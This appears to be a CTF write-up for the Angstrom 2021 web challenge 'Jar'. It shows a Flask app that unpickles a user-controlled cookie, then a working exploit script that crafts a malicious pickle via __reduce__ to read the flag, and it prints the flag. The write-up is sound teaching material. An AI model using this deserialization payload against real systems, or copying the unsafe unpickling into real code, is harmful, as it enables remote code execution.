---
name: Jar (2021)
event: Angstrom CTF 2021
category: Web
description: Writeup for Jar (Web) - Angstrom CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Jar

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/c147fBCppb8/0.jpg)](https://youtu.be/c147fBCppb8?t=28s "Angstrom 2021: Jar")

## Challenge Description

> My other pickle challenges seem to be giving you all a hard time, so here's a simpler one to get you warmed up.

## Source

{% code overflow="wrap" %}
```py
import base64
import pickle
from flask import Flask, send_file, request, make_response, redirect
import random
import os

app = Flask(__name__)

flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')

@app.route('/pickle.jpg')
def bg():
    return send_file('pickle.jpg')

@app.route('/')
def jar():
    contents = request.cookies.get('contents')
    if contents:
        items = pickle.loads(base64.b64decode(contents))
    else:
        items = []
    return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
        ''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)

@app.route('/add', methods=['POST'])
def add():
    contents = request.cookies.get('contents')
    if contents:
        items = pickle.loads(base64.b64decode(contents))
    else:
        items = []
    items.append(request.form['item'])
    response = make_response(redirect('/'))
    response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
    return response

app.run(threaded=True, host="0.0.0.0")
```
{% endcode %}

## Solution

#### exploit.py

{% code overflow="wrap" %}
```py
import pickle
import base64
import os


class RCE(object):
    def __reduce__(self):
        return (os.getenv, ('FLAG',))


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```
{% endcode %}

#### print_flag.js

{% code overflow="wrap" %}
```js
var divs = document.getElementsByTagName("div");
var flag = "";

for (var i = 0; i < divs.length; i++) {
    flag += divs[i].innerText;
}

console.log(flag);
```
{% endcode %}

Flag: `actf{you_got_yourself_out_of_a_pickle}`
